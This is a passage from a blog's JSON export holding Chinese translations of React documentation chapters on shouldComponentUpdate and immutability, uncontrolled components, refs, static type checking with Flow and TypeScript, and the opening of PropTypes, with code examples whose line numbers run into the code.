注意，当我们进入第二个待办事项时，每次输入时，第一个待办事项也会在屏幕上闪烁。这意味着它正在被重新渲染。这有时被称为浪费的渲染。我们知道这是没有必要的，因为第一个待办事项的内容没有改变，但是 React 并不知道这一点。 即使 React 只更新更改的 DOM 节点，重新渲染仍然需要一些时间。在许多情况下，这不是大问题，但是降低交互性能是显而易见的，你可以通过重写生命周期函数 shouldComponentUpdate 来优化性能，这是在重新渲染过程开始之前触发的。该函数的默认实现中返回的是 true，使得 React 执行更新操作： 123shouldComponentUpdate(nextProps, nextState) &#123; return true;&#125; 如果你知道在某些情况下你的组件不需要更新，那么你可以在 shouldComponentUpdate 返回 false 来跳过整个渲染过程，包括在这个组件和后面调用的 render() 。 在大多数情况下，可以不用手写 shouldComponentUpdate()，而是从 React.PureComponent 继承。这相当于用当前和以前 props(属性) 和 state(状态) 的浅层比较来实现 shouldComponentUpdate()。 五、应用 shouldComponentUpdate 下面有一个组件子树，其中 SCU 代表 shouldComponentUpdate 函数返回结果。vDOMEq 代表渲染的 React 元素是否相等。最后，圆圈内的颜色代表组件是否需要更新。 因为以 C2 为根节点的子树 shouldComponentUpdate 返回的是 false，React不会尝试重新渲染 C2，并且也不会尝试调用 C4 和 C5 的 shouldComponentUpdate。 对于 C1 和 C3，shouldComponentUpdate 返回 true，所以 React 需要向下遍历。对于 C6，shouldComponentUpdate 返回 true，并且需要渲染的元素不相同，因此 React 需要更新 DOM 节点。 最后一个值得注意的例子是 C8。React 必须渲染这个组件，但是由于返回的 React 元素与之前渲染的元素相比是相同的，因此不需要更新 DOM 节点。 注意，React仅仅需要修改 C6 的 DOM，这是必须的。对于 C8 来讲，通过比较渲染元素被剔除，对于 C2 子树和 C7，因为shouldComponentUpdate 被剔除，甚至都不需要比较 React 元素，也不会调用 render 方法。 六、例子 如果你想要你的组件仅当 props.color 或 state.count 发生改变时需要更新，你可以通过 shouldComponentUpdate 函数来检查： 1234567891011121314151617181920212223242526class CounterButton extends React.Component &#123; constructor(props) &#123; super(props); this.state = &#123;count: 1&#125;; &#125; shouldComponentUpdate(nextProps, nextState) &#123; if (this.props.color !== nextProps.color) &#123; return true; &#125; if (this.state.count !== nextState.count) &#123; return true; &#125; return false; &#125; render() &#123; return ( &lt;button color=&#123;this.props.color&#125; onClick=&#123;() =&gt; this.setState(state =&gt; (&#123;count: state.count + 1&#125;))&#125;&gt; Count: &#123;this.state.count&#125; &lt;/button&gt; ); &#125;&#125; 在以上代码中，shouldComponentUpdate 函数仅仅检查 props.color 或者 state.count 是否发生改变。如果这些值没有发生变化，则组件不会进行更新。如果你的组件更复杂，你可以使用类似于对 props 和 state 的所有属性进行浅比较这种模式来决定组件是否需要更新。这种模式非常普遍，因此 React 提供了一个辅助对象实现上面的逻辑：继承 React.PureComponent。因此，下面的代码是一种更简单的方式实现了相同的功能： 12345678910111213141516class CounterButton extends React.PureComponent &#123; constructor(props) &#123; super(props); this.state = &#123;count: 1&#125;; &#125; render() &#123; return ( &lt;button color=&#123;this.props.color&#125; onClick=&#123;() =&gt; this.setState(state =&gt; (&#123;count: state.count + 1&#125;))&#125;&gt; Count: &#123;this.state.count&#125; &lt;/button&gt; ); &#125;&#125; 大多数情况下，你可以使用 React.PureComponent 而不是自己编写 shouldComponentUpdate。但 React.PureComponent 仅会进项浅比较，因此如果 props 或者 state 可能会导致浅比较失败的情况下就不能使用 React.PureComponent。 如果 props 和 state 属性存在更复杂的数据结构，这可能是一个问题。例如，我们编写一个 ListOfWords 组件展现一个以逗号分隔的单词列表，在父组件 WordAdder，当你点击一个按钮时会给列表添加一个单词。下面的代码是不能正确地工作： 12345678910111213141516171819202122232425262728293031class ListOfWords extends React.PureComponent &#123; render() &#123; return &lt;div&gt;&#123;this.props.words.join(',')&#125;&lt;/div&gt;; &#125;&#125;class WordAdder extends React.Component &#123; constructor(props) &#123; super(props); this.state = &#123; words: ['marklar'] &#125;; this.handleClick = this.handleClick.bind(this); &#125; handleClick() &#123; // 这个部分是不好的风格，造成一个错误 const words = this.state.words; words.push('marklar'); this.setState(&#123;words: words&#125;); &#125; render() &#123; return ( &lt;div&gt; &lt;button onClick=&#123;this.handleClick&#125; /&gt; &lt;ListOfWords words=&#123;this.state.words&#125; /&gt; &lt;/div&gt; ); &#125;&#125; 问题是 PureComponent 只进行在旧的 this.props.words 与新的 this.props.words 之间进行前比较。因此在 WordAdder 组件中 handleClick 的代码会突变 words 数组。虽然数组中实际的值发生了变化，但旧的 this.props.words 和新的 this.props.words 值是相同的，即使 ListOfWords 需要渲染新的值，但是还是不会进行更新。 七、不可变数据的力量 避免这类问题最简单的方法是不要突变(mutate) props 或 state 的值。例如，上述 handleClick 方法可以通过使用 concat 重写: 12345handleClick() &#123; this.setState(prevState =&gt; (&#123; words: prevState.words.concat(['marklar']) &#125;));&#125; ES6 对于数组支持展开语法，使得解决上述问题更加简单。如果你使用的是 Create React App，默认支持该语法: 12345handleClick() &#123; this.setState(prevState =&gt; (&#123; words: [...prevState.words, 'marklar'], &#125;));&#125;; 你可以以一种简单的方式重写上述代码，使得改变对象的同时不会突变对象，例如，如果有一个 colormap 的对象并且编写一个函数将 colormap.right 的值改为 blue： 123function updateColorMap(colormap) &#123; colormap.right = 'blue';&#125; 在不突变原来的对象的条件下实现上面的要求，我们可以使用 Object.assign 方法，updateColorMap 现在返回一个新的对象，而不是修改原来的对象。Object.assign 属于ES6语法，需要 polyfill： 123function updateColorMap(colormap) &#123; return Object.assign(&#123;&#125;, colormap, &#123;right: 'blue'&#125;);&#125; JavaScript提案添加了对象展开符，能够更简单地更新对象而不突变对象: 123function updateColorMap(colormap) &#123; return &#123;...colormap, right: 'blue'&#125;;&#125; 如果你使用的是 Create React App ，Object.assign 和对象展开符默认都是可用的。 八、使用不可突变的数据结构 Immutable.js 是解决上述问题的另外一个方法，其提供了通过结构共享实现(Structural Sharing)的、不可变的(Immutable)、持久的(Persistent)集合: 1）不可变(Immutable): 一个集合一旦创建，在其他时间是不可更改的。 2）持久的(Persistent): 新的集合可以基于之前的结合创建并产生突变，例如：set。原来的集合在新集合创建之后仍然是可用的。 3）结构共享(Structural Sharing): 新的集合尽可能通过之前集合相同的结构创建，最小程度地减少复制操作来提高性能。 不可变性使得追踪改变非常容易。改变会产生新的对象，因此我们仅需要检查对象的引用是否改变。例如，下面是普通的JavaScript代码： 123456const x = &#123; foo: 'bar' &#125;;const y = x;y.foo = 'baz';x === y; // true虽然 y 被编辑了，但是因为引用的是相同的对象 x ,所以比较返回 true 。 你可以用 immutable.js 编写类似的代码： 123456const SomeRecord = Immutable.Record(&#123; foo: null &#125;);const x = new SomeRecord(&#123; foo: 'bar' &#125;);const y = x.set('foo', 'baz');const z = x.set('foo', 'bar');x === y; // falsex === z; // true 在这种情况下，因为当改变 x 时返回新的引用，我们可以使用一个相等检查(x===y)来验证存储在y中的新值是否与存储在x中的原始值不同。 其他两个可以帮助我们使用不可变数据的库分别是:seamless-immutable 和 immutability-helper。 不可变数据提供了一种更简单的方式来追踪对象的改变，这正是我们实现 shouldComponentUpdate 所需要的。这将会提供可观的性能提升。 标注： 参考资料1：https://reactjs.org/ 参考资料2：https://doc.react-china.org/","categories":[{"name":"前端","slug":"前端","permalink":"http://liuxuewen-site.github.io/categories/前端/"}],"tags":[{"name":"前端-react","slug":"前端-react","permalink":"http://liuxuewen-site.github.io/tags/前端-react/"}]},{"title":"React官网之17-非受控组件","slug":"React-gw-17","date":"2018-07-08T09:01:52.000Z","updated":"2019-01-23T08:39:11.916Z","comments":true,"path":"2018/07/08/React-gw-17/","link":"","permalink":"http://liuxuewen-site.github.io/2018/07/08/React-gw-17/","excerpt":"","text":"一、非受控组件 在大多数情况下，我们推荐使用受控组件来实现表单，在受控组件中，表单数据由 React 组件负责处理。另外一个选择是不受控组件，其表单数据由 DOM 元素本身处理，要编写一个未控制组件，你可以使用一个 ref 来从 DOM 获得表单值，而不是为每个状态更新编写一个事件处理程序。 例如，在不受控组件中，以下代码接受一个单独的名字 : 1234567891011121314151617181920212223class NameForm extends React.Component &#123; constructor(props) &#123; super(props); this.handleSubmit = this.handleSubmit.bind(this); &#125; handleSubmit(event) &#123; alert('A name was submitted: ' + this.input.value); event.preventDefault(); &#125; render() &#123; return ( &lt;form onSubmit=&#123;this.handleSubmit&#125;&gt; &lt;label&gt; Name: &lt;input type=\"text\" ref=&#123;(input) =&gt; this.input = input&#125; /&gt; &lt;/label&gt; &lt;input type=\"submit\" value=\"Submit\" /&gt; &lt;/form&gt; ); &#125;&#125; 因为不受控组件的数据来源是 DOM 元素，当使用不受控组件时很容易实现 React 代码与非 React 代码的集成。如果你希望的是快速开发、不要求代码质量，不受控组件可以一定程度上减少代码量。否则你应该使用受控组件。如果不清楚在某个特定方案你应该使用哪种类型的组件，可以看看 这里 。 二、默认值 在 React 渲染生命周期中，表单元素中的 value 属性将会覆盖 DOM 中的 value。在不受控组件中，通常你希望 React 可以为其指定初始值，但不再控制后续更新。在这种情况下，你需要使用 defaultValue 属性而不是 value 属性: 1234567891011121314render() &#123; return ( &lt;form onSubmit=&#123;this.handleSubmit&#125;&gt; &lt;label&gt; Name: &lt;input defaultValue=\"Bob\" type=\"text\" ref=&#123;(input) =&gt; this.input = input&#125; /&gt; &lt;/label&gt; &lt;input type=\"submit\" value=\"Submit\" /&gt; &lt;/form&gt; );&#125; 同样， &lt; input type=”checkbox” &gt; 和 &lt; input type=”radio” &gt; 支持 defaultChecked，而 &lt; select &gt; 和 &lt; textarea &gt; 支持 defaultValue。 三、文件输入标签 在 HTML 中，&lt; input type=”file” &gt; 可以让用户从其设备存储中选择一个或多个文件上传到服务器，或通过 File API 进行操作： 1&lt;input type=\"file\" /&gt; 在 React 中，&lt; input type=”file” /&gt; 始终是一个不受控制的组件，因为它的值只能由用户设置，而不是以编程方式设置。 你应该使用 File API 与文件进行交互。以下示例显示如何创建 ref 节点以访问提交处理程序中的文件： 12345678910111213141516171819202122232425262728293031323334353637class FileInput extends React.Component &#123; constructor(props) &#123; super(props); this.handleSubmit = this.handleSubmit.bind(this); &#125; handleSubmit(event) &#123; event.preventDefault(); alert( `Selected file - $&#123;this.fileInput.files[0].name&#125;` ); &#125; render() &#123; return ( &lt;form onSubmit=&#123;this.handleSubmit&#125;&gt; &lt;label&gt; Upload file: &lt;input type=\"file\" ref=&#123;input =&gt; &#123; this.fileInput = input; &#125;&#125; /&gt; &lt;/label&gt; &lt;br /&gt; &lt;button type=\"submit\"&gt;Submit&lt;/button&gt; &lt;/form&gt; ); &#125;&#125;ReactDOM.render( &lt;FileInput /&gt;, document.getElementById('root')); 标注： 参考资料1：https://reactjs.org/ 参考资料2：https://doc.react-china.org/","categories":[{"name":"前端","slug":"前端","permalink":"http://liuxuewen-site.github.io/categories/前端/"}],"tags":[{"name":"前端-react","slug":"前端-react","permalink":"http://liuxuewen-site.github.io/tags/前端-react/"}]},{"title":"React官网之16-Refs & DOM","slug":"React-gw-16","date":"2018-07-08T08:01:52.000Z","updated":"2019-01-23T08:36:20.740Z","comments":true,"path":"2018/07/08/React-gw-16/","link":"","permalink":"http://liuxuewen-site.github.io/2018/07/08/React-gw-16/","excerpt":"","text":"一、前言 在常规的 React 数据流中，props 是父组件与子组件交互的唯一方式。要修改子元素，你需要用新的 props 去重新渲染子元素。然而，在少数情况下，你需要在常规数据流外强制修改子元素。被修改的子元素可以是 React 组件实例，或者是一个 DOM 元素。在这种情况下，React 提供了解决办法。 二、何时使用 Refs React 支持给任何组件添加特殊属性。ref 属性接收回调函数，并且当组件 装载(mounted) 或者 卸载(unmounted) 之后，回调函数会立即执行。 下面是一些正好使用 refs 的场景: 1）处理focus、文本选择或者媒体播放； 2）触发强制动画； 3）集成第三方DOM库； 三、不要过度使用 Refs 可能首先会想到在应用程序中使用 refs 来更新组件，建议多关注在组件层中使用 state，在组件层中，通常较高级别的 state 更为清晰。请参考状态提升一章。 如果可以通过声明式实现，就尽量避免使用 refs。例如，相比于在 Dialog 组件中暴露 open() 和 close() 方法，最好是传递 isOpen 属性。 四、创建 Refs 使用 React.createRef() 创建 refs，通过 ref 属性来获得 React 元素。当构造组件时，refs 通常被赋值给实例的一个属性，这样你可以在组件中任意一处使用它们： 123456789class MyComponent extends React.Component &#123; constructor(props) &#123; super(props); this.myRef = React.createRef(); &#125; render() &#123; return &lt;div ref=&#123;this.myRef&#125; /&gt;; &#125;&#125; 五、访问 Refs 当一个 ref 属性被传递给一个 render 函数中的元素时，可以使用 ref 中的 current 属性对节点的引用进行访问： 1const node = this.myRef.current; ref 的值取决于节点的类型: 1、当 ref 属性被用于一个普通的 HTML 元素时，React.createRef() 将接收底层 DOM 元素作为它的 current 属性以创建 ref 。 2、当 ref 属性被用于一个自定义类组件时，ref 对象将接收该组件已挂载的实例作为它的 current 。 3、你不能在函数式组件上使用 ref 属性，因为它们没有实例。 六、在DOM元素上添加 Ref 当给 HTML 元素添加 ref 属性时，ref 回调接收底层的 DOM 元素作为参数。例如，下面的代码使用 ref 回调来存储 DOM 节点的引用： 12345678910111213141516171819202122232425262728class CustomTextInput extends React.Component &#123; constructor(props) &#123; super(props); this.focus = this.focus.bind(this); &#125; focus() &#123; // 通过使用原生API，显式地聚焦text输入框 this.textInput.focus(); &#125; render() &#123; // 在实例中通过使用`ref`回调函数来存储text输入框的DOM元素引用(例如:this.textInput) return ( &lt;div&gt; &lt;input type=\"text\" ref=&#123;(input) =&gt; &#123; this.textInput = input; &#125;&#125; /&gt; &lt;input type=\"button\" value=\"Focus the text input\" onClick=&#123;this.focus&#125; /&gt; &lt;/div&gt; ); &#125;&#125; React 组件在加载时将 DOM 元素传入 current 属性，在卸载时则会改回 null。ref 的更新会发生在 componentDidMount 或 componentDidUpdate 生命周期钩子之前。 使用 ref 回调只是为了在类上设置一个属性，是访问 DOM 元素的常见模式。首选的方法是在 ref 回调中设置属性，就像上面的例子一样。 甚至有一个较短的写法：ref={input =&gt; this.textInput = input} 。 七、为类组件添加 Ref 当 ref 属性用于类声明的自定义组件时，ref 回调函数收到的参数是装载(mounted)的组件实例。例如，如果我们想包装上面的 CustomTextInput 组件，实现组件在 装载(mounted) 后立即点击的效果，我们可以使用 ref 来访问自定义输入，并手动调用它的 focusTexInput 方法： 123456789101112class AutoFocusTextInput extends React.Component &#123; componentDidMount() &#123; this.textInput.focus(); &#125; render() &#123; return ( &lt;CustomTextInput ref=&#123;(input) =&gt; &#123; this.textInput = input; &#125;&#125; /&gt; ); &#125;&#125; 需要注意的是，这种方法仅对以类(class)声明的 CustomTextInput 有效: 123class CustomTextInput extends React.Component &#123; // ...&#125; 八、Refs 与函数式组件 你不能在函数式组件上使用 ref 属性，因为它们没有实例: 12345678910111213function MyFunctionalComponent() &#123; return &lt;input /&gt;;&#125;class Parent extends React.Component &#123; render() &#123; // 这里 *不会* 执行！ return ( &lt;MyFunctionalComponent ref=&#123;(input) =&gt; &#123; this.textInput = input; &#125;&#125; /&gt; ); &#125;&#125; 如果你需要使用 ref，你需要将组件转化成类组件，就像需要生命周期方法或者 state 一样。但是你可以在函数式组件内部使用 ref，只要它指向一个 DOM 元素或者 class 组件： 123456789101112131415161718192021function CustomTextInput(props) &#123; // textInput必须在这里声明，所以 ref 回调可以引用它 let textInput = null; function handleClick() &#123; textInput.focus(); &#125; return ( &lt;div&gt; &lt;input type=\"text\" ref=&#123;(input) =&gt; &#123; textInput = input; &#125;&#125; /&gt; &lt;input type=\"button\" value=\"Focus the text input\" onClick=&#123;handleClick&#125; /&gt; &lt;/div&gt; ); &#125; 九、对父组件暴露DOM节点 在极少数情况下，可能希望从父组件访问子节点的 DOM 节点。通常不建议这样做，因为它会破坏组件的封装，但偶尔也可用于触发焦点或测量子 DOM 节点的大小或位置。 虽然你可以向子组件添加 ref,但这不是一个理想的解决方案，因为你只能获取组件实例而不是 DOM 节点。并且，它还在函数式组件上无效。 如果你使用 React 16.3 或更高, 这种情况下我们推荐使用 ref 转发。Ref 转发使组件可以像暴露自己的 ref 一样暴露子组件的 ref。关于怎样对父组件暴露子组件的 DOM 节点，在 ref 转发文档 中有一个详细的例子（看传递 Refs 一章）。 如果你使用 React 16.2 或更低，或者你需要比 ref 转发更高的灵活性，你可以使用这个替代方案，将 ref 作为特殊名字的 prop 直接传递。 总而言之，我们建议尽可能不暴露 DOM 节点，但这是一个有用的解决方式。请注意，此方法要求您向子组件添加一些代码，如果你无法完全控制子组件，最后的办法是使用 findDOMNode()，但是不推荐这样做。 十、回调 Refs React 也支持另一种设置 ref 的方式，称为回调 ref，更加细致地控制何时 ref 被设置和解除。不同于传递 createRef() 创建的 ref 属性，你会传递一个函数。这个函数接受 React 组件的实例或 HTML DOM 元素作为参数，以存储它们并使它们能被其他地方访问。 下面的例子描述了一种通用的范例：使用 ref 回调函数，在实例的属性中存储对 DOM 节点的引用： 123456789101112131415161718192021222324252627282930313233343536373839class CustomTextInput extends React.Component &#123; constructor(props) &#123; super(props); this.textInput = null; this.setTextInputRef = element =&gt; &#123; this.textInput = element; &#125;; this.focusTextInput = () =&gt; &#123; // 直接使用原生 API 使 text 输入框获得焦点 if (this.textInput) this.textInput.focus(); &#125;; &#125; componentDidMount() &#123; // 渲染后文本框自动获得焦点 this.focusTextInput(); &#125; render() &#123; // 使用 `ref` 的回调将 text 输入框的 DOM 节点存储到 React // 实例上（比如 this.textInput） return ( &lt;div&gt; &lt;input type=\"text\" ref=&#123;this.setTextInputRef&#125; /&gt; &lt;input type=\"button\" value=\"Focus the text input\" onClick=&#123;this.focusTextInput&#125; /&gt; &lt;/div&gt; ); &#125;&#125; 你可以在组件间传递回调形式的 refs，就像你可以传递通过 React.createRef() 创建的对象 refs 一样: 1234567891011121314151617function CustomTextInput(props) &#123; return ( &lt;div&gt; &lt;input ref=&#123;props.inputRef&#125; /&gt; &lt;/div&gt; );&#125;class Parent extends React.Component &#123; render() &#123; return ( &lt;CustomTextInput inputRef=&#123;el =&gt; this.inputElement = el&#125; /&gt; ); &#125;&#125; 在上面的例子中，Parent 将它的 ref 回调作为一个特殊的 inputRef 传递给 CustomTextInput，然后 CustomTextInput 通过 ref 属性将其传递给 &lt; input &gt;。最终，Parent 中的 this.inputElement 将被设置为与 CustomTextInput 中的 &lt; input &gt; 元素相对应的 DOM 节点。 注意，上述示例中的 inputRef 属性没有特殊的含义，它只是一般的组件属性。然而，使用 &lt; input &gt; 本身的 ref 属性很重要，因为它告诉 React 将 ref 附加到它的 DOM 节点。 即使 CustomTextInput 是一个函数式组件，它也同样有效。与只能为 DOM 元素和 class 组件指定的 ref 不同，诸如 inputRef 这种自定义的组件属性则没有限制。 这种模式的另一个好处是它能作用很深。假如有个 Parent 组件不需要 DOM 节点 A，但是某个渲染 Parent 的组件（我们称之为 Grandparent）需要通过它访问。这时我们可以让 Grandparent 传递 inputRef 给 Parent 组件，然后让 Parent 组件将其转发给 CustomTextInput: 1234567891011121314151617181920212223242526function CustomTextInput(props) &#123; return ( &lt;div&gt; &lt;input ref=&#123;props.inputRef&#125; /&gt; &lt;/div&gt; );&#125;function Parent(props) &#123; return ( &lt;div&gt; My input: &lt;CustomTextInput inputRef=&#123;props.inputRef&#125; /&gt; &lt;/div&gt; );&#125;class Grandparent extends React.Component &#123; render() &#123; return ( &lt;Parent inputRef=&#123;el =&gt; this.inputElement = el&#125; /&gt; ); &#125;&#125; 上面的例子中，Grandparent 首先指定了 ref 回调函数。它通过一个常规的 inputRef 属性被传递到 Parent，Parent 也同样把它传递给了 CustomTextInput。最后 CustomTextInput 读取了 inputRef 属性并将传递的函数作为 ref 属性附加到 &lt; input &gt;。最终，Grandparent 中的 this.inputElement 被设置为 CustomTextInput 的 input 对应的 DOM 节点。 十一、旧版API: String 类型的 Refs 如果你之前使用过 React ，你可能了解过之前的 API 中的 string 类型的 ref 属性。类似于 textInput，可以通过 this.refs.textInput 访问 DOM 节点。我们不建议使用，因为 string 类型的 refs 存在问题。已经过时了，可能会在未来的版本移除。如果你目前还在使用 this.refs.textInput 这种方式访问 refs ，我们建议用回调函数的方式代替。 十二、注意 如果 ref 回调以内联函数的方式定义，在更新期间会被调用两次，第一次参数是 null ，之后参数是 DOM 元素。这是因为在每次渲染中都会创建一个新的函数实例。因此，React 需要清理旧的 ref 并且设置新的。通过将 ref 的回调函数定义成类的绑定函数的方式可以避免上述问题，但是在大多数例子中这都不是很重要。 标注： 参考资料1：https://reactjs.org/ 参考资料2：https://doc.react-china.org/","categories":[{"name":"前端","slug":"前端","permalink":"http://liuxuewen-site.github.io/categories/前端/"}],"tags":[{"name":"前端-react","slug":"前端-react","permalink":"http://liuxuewen-site.github.io/tags/前端-react/"}]},{"title":"React官网之15-静态类型检查","slug":"React-gw-15","date":"2018-07-08T07:01:52.000Z","updated":"2019-01-23T07:58:24.799Z","comments":true,"path":"2018/07/08/React-gw-15/","link":"","permalink":"http://liuxuewen-site.github.io/2018/07/08/React-gw-15/","excerpt":"","text":"一、前言 像 Flow 和 TypeScript 这样的静态类型检查器可以在运行代码之前识别某些类型的问题。他们还可以通过添加自动完成功能来改善开发人员的工作流程。出于这个原因，对于更大的代码库我们建议使用 Flow 或者 TypeScript 来替代 PropTypes。 二、Flow Flow 是一个针对 JavaScript 代码的静态类型检查器。它是在 Facebook 开发的，经常和 React 一起使用。它可以让你使用特殊的类型语法来注释变量，函数和 React 组件，并尽早地发现错误。 Flow介绍 。 为了使用 Flow, 你需要： 1）将 Flow 添加到您的项目作为依赖项。 2）确保编译后的代码中去除了 Flow 语法。 3）添加了类型注释并运行 Flow 来检查它们。 下面详细解释这些步骤： 1、项目中添加 Flow： 首先，在你的终端里进入到项目目录，执行两条命令。 yarn： 12yarn add --dev flow-binyarn run flow init npm： 12npm install --save-dev flow-binnpm run flow init 第一个命令在你的项目中安装了最新版的 Flow。第二个命令创建一个您需要提交的 Flow 配置文件。 最后，将 flow 添加到你的 package.json中的 “scripts” 部分： 12345678&#123; // ... \"scripts\": &#123; \"flow\": \"flow\", // ... &#125;, // ...&#125; 2、编译后剥离 Flow 语法： Flow 通过使用类型注释的特殊语法扩展了 JavaScript 语言。然而，浏览器并不知道这个语法，所以我们需要确保发送到浏览器的已编译的 JavaScript 包中 Flow 已结束。确切的做法取决于你用来编译 JavaScript 的工具。 A、Create React App： 如果项目是使用 Create React App 建立的，Flow 此时已经被默认剥离，所以在这你不需要做任何事情。 B、Babel： 如果你手动为你的项目配置了 Babel，你将需要为 Flow 安装一个特殊的 preset。 yarn： 1yarn add --dev babel-preset-flow npm: 1npm install --save-dev babel-preset-flow 然后将 flow preset 加入你的 Babel 配置。比如，如果你通过 .babelrc 文件配置 Babel，它可能会如下所示，这将会让你可以在你的代码中使用 Flow 语法： 123456&#123; \"presets\": [ \"flow\", \"react\" ]&#125; 注意： 1、上面说明不适用于使用 Create React App 的用户。即使 Create React App 在底层使用 Babel，它已经被配置为理解 Flow。只有那些没有使用 Create React App 的用户才需要跟进上面的步骤。 2、Flow 不需要 react preset，但他们经常在一起使用。Flow 本身就理解 JSX 语法。 C、其他生成设置： 如果你既不用 Create React App 也不用 Babel，你可以使用 flow-remove-types 来去除类型注释。 3、运行 Flow： 如果遵循了上述的说明，应该能够在第一次就成功运行 Flow。 yarn： 1yarn flow npm: 1npm run flow 你应该会看到一条这样的消息： 12No errors!✨ Done in 0.17s. 4、添加 Flow 类型注释： 默认情况下， Flow 仅检查包含此批注的文件： 1// @flow 通常它被放置在文件的顶部。尝试将其添加到项目中的某些文件中，然后运行 yarn flow 或 npm run flow 来查看 Flow 是否已经发现了一些问题。也有一个选择可以强制 Flow 不考虑注释检查所有文件. 对于现有的项目它可能太繁琐了，但对于一个新项目如果你想完全用 Flow 来组织，那会是合理的。 三、TypeScript TypeScript 是一门由微软开发的编程语言。它是 JavaScript 的一个类型超集，包含它自己的编译器。作为一种类型化语言，Typescript 可以在应用程序上线之前在构建时发现错误和错误。 TypeScript介绍1 、 TypeScript介绍2 要使用 TypeScript，你需要： 1）将 Typescript 添加为您的项目的依赖项 2）配置 TypeScript 编译器选项 3）使用正确的文件扩展名 4）为你使用的库添加定义 让我们来详细介绍一下。 1、项目中添加 TypeScript： yarn： 1yarn add --dev typescript npm: 1npm install --save-dev typescript 已经将最新版本的 TypeScript 安装到您的项目中。安装 TypeScript 让我们可以访问 tsc 命令。在配置之前，让我们将 tsc 添加到 package.json 中的 scripts 部分： 12345678&#123; // ... \"scripts\": &#123; \"build\": \"tsc\", // ... &#125;, // ...&#125; 2、配置 TypeScript 编译器: 除非我们告诉编译器要做什么，否则它对我们将毫无用处。在 TypeScript 中，这些规则定义在一个叫 tsconfig.json 的特殊文件中。运行如下命令生成该文件： 1tsc --init 看看现在生成的 tsconfig.json，你可以看到有很多选项可以用来配置编译器。有关所有 选项 的详细说明看。 在许多选项中，我们会看到 rootDir 和 outDir。编译器将以真实的情况接收 typescript 文件然后生成 javascript 文件。然而我们不想混淆源文件和编译后的输出。我们将通过两个步骤解决这个问题： A、首先，让我们像这样安排我们的项目结构。我们将所有的源代码放在 src 目录中。 1234├── package.json├── src│ └── index.ts└── tsconfig.json B、接下来，我们会告诉编译器源代码在哪以及编译后输出该放哪。 12345678910// tsconfig.json&#123; \"compilerOptions\": &#123; // ... \"rootDir\": \"src\", \"outDir\": \"build\" // ... &#125;,&#125; 现在当我们运行构建脚本时编译器会将生成的 javascript 代码输出到 build 文件夹。 TypeScript React Starter 提供了一个带有一套配置的 tsconfig.json 文件让你上手。 通常，您不希望将生成的 JavaScript 保留在源代码管理中，因此请确保将生成文件夹添加到 .gitignore 中。 3、文件扩展名： 在 React 中，你最有可能在 .js 文件中编写你的组件。在 TypeScript 中我们有两个文件扩展名： 1）.ts 是默认的文件扩展名。 2）.tsx 是一个为包含 JSX 代码使用的特殊扩展名。 4、运行 TypeScript： 如果遵循了如上的说明，应该能够第一次就成功运行 TypeScript。 yarn： 1yarn build npm: 1npm run build 如果你没有看到输出，这意味着它完全编译成功了。 5、类型定义： 为了能够显示来自其他包的错误和提示，编译器依赖于声明文件。声明文件提供了关于库的所有类型信息。这使我们能够在我们的项目中使用像那些在 npm 中的 JavaScript 库。 对于一个库来说，主要有两种方式获得声明： A、Bundled - 该库捆绑了自己的声明文件。 这对我们来说很好，因为我们所要做的就是安装这个库，我们便可以马上使用它。 要检查一个库是否有 bundled 类型，请在项目中查找 index.d.ts 文件。 有些库会在 package.json 文件的 typings 或者 types 属性中指定它。 B、DefinitelyTyped - DefinitelyTyped 是一个不包含声明文件的库的声明库。这些声明是由微软和开源贡献者提供的。 例如 React 并不捆绑它自己的声明文件。 相反，我们可以从 DefinitelyTyped 中获得。 为此，请在终端中输入此命令 12345# yarnyarn add --dev @types/react# npmnpm i --save-dev @types/react 局部声明: 有时你想使用的包不包含声明，也不能在 DefinitelyTyped 上使用。 在这种情况下，我们可以有一个本地声明文件。 为此，请在源目录的根目录中创建一个 declarations.d.ts 文件。 一个简单的声明可能是这样的： 1234declare module 'querystring' &#123; export function stringify(val: object): string export function parse(val: string): object&#125; 6、和 Create React App 一起使用 TypeScript： react-scripts-ts 自动配置了一个 create-react-app 项目支持 TypeScript。你可以像这样使用： 1create-react-app my-app --scripts-version=react-scripts-ts 注意它是一个第三方项目，而且不是 Create React App 的一部分。 四、Reason Reason 不是一种新的语言，这是一个新的语法和工具链，由测试语言 OCaml 提供支持。Reason 使 OCaml 成为了面向 JavaScript 程序员的熟悉语法，而且迎合现有已知的 NPM/Yarn 工作流。 Reason 是在 Facebook 开发的，并且在其一些产品如 Messenger 中使用。它仍然具有一定的实验性质，但它有由 Facebook 维护的专门的 React 绑定 和一个充满活力的社区。 五、Kotlin Kotlin 是由 JetBrains 开发的一门静态类型语言。其目标平台包括 JVM，Android，LLVM 和 JavaScript。 JetBrains 专门为 React 社区开发和维护了几个工具： React bindings 以及 Create React Kotlin App。后者可以帮助您开始使用Kotlin 构建 React 应用程序，而不需要构建配置。 六、其他语言 还有其他静态类型的语言可以编译成 JavaScript，因此是 React 兼容的。例如，和 elmish-react 一起使用的 F#/Fable。可查看他们各自的网站以获取更多信息！ 标注： 参考资料1：https://reactjs.org/ 参考资料2：https://doc.react-china.org/","categories":[{"name":"前端","slug":"前端","permalink":"http://liuxuewen-site.github.io/categories/前端/"}],"tags":[{"name":"前端-react","slug":"前端-react","permalink":"http://liuxuewen-site.github.io/tags/前端-react/"}]},{"title":"React官网之14-使用 PropTypes 进行类型检查","slug":"React-gw-14","date":"2018-07-08T06:01:52.000Z","updated":"2018-12-21T15:57:19.423Z","comments":true,"path":"2018/07/08/React-gw-14/","link":"","permalink":"http://liuxuewen-site.github.io/2018/07/08/React-gw-14/","excerpt":"","text":"一、前言 注意：从 React v15.5 开始，React.PropTypes 已被弃用，使用 prop-types 库代替。 随着应用规模的提升，你可以通过类型检测捕获大量的bug。对于部分应用来说，你可以使用 Flow 或者 TypeScript 等 JavaScript 扩展来对整个应用程序进行类型检查。即使你不使用这些，React 也有一些内置的类型检查功能。要在组件中进行类型检测，你需要配置特殊的 propTypes 属性。 12345678910111213import PropTypes from 'prop-types';class Greeting extends React.Component &#123; render() &#123; return ( &lt;h1&gt;Hello, &#123;this.props.name&#125;&lt;/h1&gt; ); &#125;&#125;Greeting.propTypes = &#123; name: PropTypes.string&#125;; PropTypes 包含一整套验证器，可用于确保你接收的数据是有效的。例如，我们可以使用PropTypes.string 语句。当给 prop 传递了一个不正确的值时，JavaScript控制台将会显示一条警告。出于性能的原因，propTypes 仅在开发模式中检测。 二、PropTypes 下面是使用不同验证器的例子： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475import PropTypes from 'prop-types';MyComponent.propTypes = &#123; // 可以将属性声明为以下 JS 原生类型 optionalArray: 